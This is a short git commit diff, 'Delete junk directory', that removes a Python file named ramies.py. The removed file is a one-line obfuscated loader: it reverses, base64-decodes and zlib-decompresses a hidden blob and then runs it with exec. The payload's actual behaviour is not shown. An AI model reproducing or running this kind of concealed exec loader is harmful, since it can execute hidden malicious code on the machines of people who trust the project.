c865ab9445fb32607c699de718895991f9de0420
swivel <nah.id.win.286h@gmail.com>
2026-09-21 21:04:48 -0600

    Delete junk directory

--- junk/ramies.py
+++
@@ -1,2 +0,0 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==AXTBxqXs5NqHNXIo9u8uzYp9NBxOYCva0UUo6X4XnNION1ORd3oTcPS3qUmLq+jsoxD2Cq5hbgfTg8HRhrkm/uT85mgIcCFxvjLbrc1fIC2N3634wCeucnPLjUnSVjUKloEXs9m/Lmto0ZdL3xCLC4oGWLsHjiWVERnjDTD7AHVHKYIur/XE8N9OZcDEV3GjNIF2qYWIMINmIokobR8tPRUEjAKsbjlxJe'))
